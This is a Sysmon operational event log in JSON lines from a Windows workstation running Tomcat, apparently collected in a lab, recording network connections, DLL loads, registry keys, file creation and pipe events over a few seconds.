{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.347Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:05.1230000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"Protocol\":\"tcp\",\"Initiated\":\"false\",\"SourceIsIpv6\":\"false\",\"SourceIp\":\"192.168.3.5\",\"SourceHostname\":\"-\",\"SourcePort\":\"50452\",\"SourcePortName\":\"-\",\"DestinationIsIpv6\":\"false\",\"DestinationIp\":\"192.168.2.5\",\"DestinationHostname\":\"-\",\"DestinationPort\":\"8080\",\"DestinationPortName\":\"-\"}","EventID":3,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.347Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:05.1350000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f216-000000000600}\",\"ProcessId\":\"7716\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"Protocol\":\"tcp\",\"Initiated\":\"true\",\"SourceIsIpv6\":\"false\",\"SourceIp\":\"192.168.2.5\",\"SourceHostname\":\"-\",\"SourcePort\":\"54217\",\"SourcePortName\":\"-\",\"DestinationIsIpv6\":\"false\",\"DestinationIp\":\"169.254.169.254\",\"DestinationHostname\":\"-\",\"DestinationPort\":\"80\",\"DestinationPortName\":\"-\"}","EventID":3,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.46Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.4580000Z\",\"EventType\":\"CreateKey\",\"ProcessGuid\":\"{f3329a35-9475-627d-4300-000000000600}\",\"ProcessId\":\"3012\",\"Image\":\"C:\\\\Windows\\\\system32\\\\svchost.exe\",\"TargetObject\":\"HKU\\\\.DEFAULT\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Connections\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":12,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.51Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.4890000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\NapiNSP.dll\",\"FileVersion\":\"10.0.19041.546 (WinBuild.160101.0800)\",\"Description\":\"E-mail Naming Shim Provider\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"napinsp.dll\",\"Hashes\":\"SHA1=77E2D89D09CB600153624326ACC89294B5AF4AEF,MD5=5CFFCD8657BD679A9A27B724F00AEA3A,SHA256=0A8C9CDE1DC0575DCF76512FCDEC87D70CFE15771417642642CA7D011A4AE2A0,IMPHASH=245E1B1597722D5672F6E6D8FEB5121F\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.52Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5130000Z\",\"EventType\":\"CreateKey\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"TargetObject\":\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":12,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.52Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5130000Z\",\"EventType\":\"CreateKey\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"TargetObject\":\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":12,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.52Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5130000Z\",\"EventType\":\"CreateKey\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"TargetObject\":\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":12,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.52Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5130000Z\",\"EventType\":\"CreateKey\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"TargetObject\":\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\"}","EventID":12,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.523Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.4930000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\pnrpnsp.dll\",\"FileVersion\":\"10.0.19041.546 (WinBuild.160101.0800)\",\"Description\":\"PNRP Name Space Provider\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"pnrpnsp.dll\",\"Hashes\":\"SHA1=84C50C384C79048C91A06493E31247EC812B7EFC,MD5=F5141D957403B35702947066051CB944,SHA256=0C65ED5C1EE3B0C8103D911F3FB2C9A7A8F0B398A9B349786F0C66313839C3AE,IMPHASH=F1136EAC0F92127A1F9879204AD29CA4\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.54Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5030000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\wshbth.dll\",\"FileVersion\":\"10.0.19041.546 (WinBuild.160101.0800)\",\"Description\":\"Windows Sockets Helper DLL\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"wshbth.dll\",\"Hashes\":\"SHA1=7DBBC2DA9998A00F9CB4C0E45A1A093D2E3149C5,MD5=5D45B3C64D79C5120F4C48B4D77CF99D,SHA256=FACAB1FB45CC5689D131B17DC094A4E44068F00C2D447BB78CB74E880CB004C6,IMPHASH=5962EB683BA24539103F0527FFB20DA9\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.603Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5080000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\nlaapi.dll\",\"FileVersion\":\"10.0.19041.1151 (WinBuild.160101.0800)\",\"Description\":\"Network Location Awareness 2\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"nlaapi.dll\",\"Hashes\":\"SHA1=68AAF743BFEF529269F016DB356607F0E9AFF66B,MD5=CE312D122D84520C6520A015B7709F7C,SHA256=4EBFA27F7FFBEF061C1A14256B8BE848B4895B03DBCDAA9F715D3C301EA78783,IMPHASH=81595ED8AC6512D496AE11576722F722\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.683Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.5130000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"ImageLoaded\":\"C:\\\\Windows\\\\System32\\\\winrnr.dll\",\"FileVersion\":\"10.0.19041.546 (WinBuild.160101.0800)\",\"Description\":\"LDAP RnR Provider DLL\",\"Product\":\"Microsoft® Windows® Operating System\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"winrnr\",\"Hashes\":\"SHA1=1BCFE975B57C4CBB9BDBD9804146D85DA6B903F7,MD5=11B768C4A439A4D895F511836C18F3C5,SHA256=A47CE5A6EED111C67CD7C2FC6B4B9C44426115DF723B94644EF6FAF8BBA95712,IMPHASH=DEA70A627F0E56AA99E3D9BA920C9ED8\",\"Signed\":\"true\",\"Signature\":\"Microsoft Windows\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.693Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.6900000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"TargetFilename\":\"C:\\\\ProgramData\\\\Tomcat9\\\\logs\\\\vulnapp-2.14.0.log\",\"CreationUtcTime\":\"2022-05-13T08:54:06.6830000Z\"}","EventID":11,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.797Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.4420000Z\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"QueryName\":\"WORKSTATION5\",\"QueryStatus\":\"0\",\"QueryResults\":\"fe80::798a:6744:8c18:1b47;::ffff:192.168.2.5;\"}","EventID":22,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.91Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:05.7740000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f216-000000000600}\",\"ProcessId\":\"7716\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"Protocol\":\"tcp\",\"Initiated\":\"true\",\"SourceIsIpv6\":\"false\",\"SourceIp\":\"192.168.2.5\",\"SourceHostname\":\"-\",\"SourcePort\":\"54223\",\"SourcePortName\":\"-\",\"DestinationIsIpv6\":\"false\",\"DestinationIp\":\"169.254.169.254\",\"DestinationHostname\":\"-\",\"DestinationPort\":\"80\",\"DestinationPortName\":\"-\"}","EventID":3,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:06.927Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:06.9230000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f216-000000000600}\",\"ProcessId\":\"7716\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"ImageLoaded\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\clrcompression.dll\",\"FileVersion\":\"4.8.4084.0 built by: NET48REL1\",\"Description\":\"Native data compression routines\",\"Product\":\"Microsoft® .NET Framework\",\"Company\":\"Microsoft Corporation\",\"OriginalFileName\":\"clrcompression.dll\",\"Hashes\":\"SHA1=5CE94A58C75344A686F5F6BCDF6DF0E79F6460CF,MD5=11436BFFD51012FFE552E5235116DC7E,SHA256=69BD1A83EFCA836D66AA32EE14D7C802F507ED78BA5C185D3F212F681CC2A9E9,IMPHASH=07B48281775EC08A0602A20A04CFC132\",\"Signed\":\"true\",\"Signature\":\"Microsoft Corporation\",\"SignatureStatus\":\"Valid\"}","EventID":7,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:07.007Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:07.0030000Z\",\"EventType\":\"CreateKey\",\"ProcessGuid\":\"{f3329a35-9476-627d-5700-000000000600}\",\"ProcessId\":\"3608\",\"Image\":\"C:\\\\Windows\\\\system32\\\\svchost.exe\",\"TargetObject\":\"HKU\\\\.DEFAULT\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\PushNotifications\\\\Backup\",\"User\":\"NT AUTHORITY\\\\SYSTEM\"}","EventID":12,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:07.467Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:07.4510000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f216-000000000600}\",\"ProcessId\":\"7716\",\"Image\":\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"Hashes\":\"SHA1=FB7C5C1E19C953A31840ECAF6454B2B395C6035D,MD5=95969DE9DEB034886660E3697275611C,SHA256=E73E33D3970618146CCA5B7093F5449907FD3081096D1F00BCD0947ED9FAF8A4,IMPHASH=00000000000000000000000000000000\",\"TargetFilename\":\"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\PowerShell\\\\StartupProfileData-NonInteractive\",\"IsExecutable\":\"false\"}","EventID":26,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:07.467Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:07.4560000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f216-000000000600}\",\"ProcessId\":\"7716\",\"Image\":\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"TargetFilename\":\"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\PowerShell\\\\StartupProfileData-NonInteractive\",\"CreationUtcTime\":\"2022-05-12T17:00:36.2800000Z\"}","EventID":11,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:07.5Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:07.4860000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f216-000000000600}\",\"ProcessId\":\"7716\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\"}","EventID":5,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:07.513Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:07.5060000Z\",\"ProcessGuid\":\"{f3329a35-1ca8-627e-f316-000000000600}\",\"ProcessId\":\"11924\",\"Image\":\"C:\\\\Windows\\\\System32\\\\conhost.exe\",\"User\":\"NT AUTHORITY\\\\SYSTEM\"}","EventID":5,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.42Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4160000Z\",\"EventType\":\"CreatePipe\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"PipeName\":\"\u003cAnonymous Pipe\u003e\"}","EventID":17,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","SourceSystem":"OpsManager","TimeGenerated":"2022-05-13T08:54:08.42Z","Provider":"Microsoft-Windows-Sysmon","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"WORKSTATION5","Task":1,"EventLevel":4,"EventLevelName":"Information","EventData":"{\"RuleName\":\"-\",\"UtcTime\":\"2022-05-13T08:54:08.4160000Z\",\"EventType\":\"ConnectPipe\",\"ProcessGuid\":\"{f3329a35-1c6c-627e-e516-000000000600}\",\"ProcessId\":\"3936\",\"Image\":\"C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Tomcat\\\\tools\\\\apache-tomcat-9.0.62\\\\bin\\\\Tomcat9.exe\",\"User\":\"NT AUTHORITY\\\\LOCAL SERVICE\",\"PipeName\":\"\u003cAnonymous Pipe\u003e\"}","EventID":18,"EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","ManagementGroupName":"AOI-redacted","Type":"WindowsEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
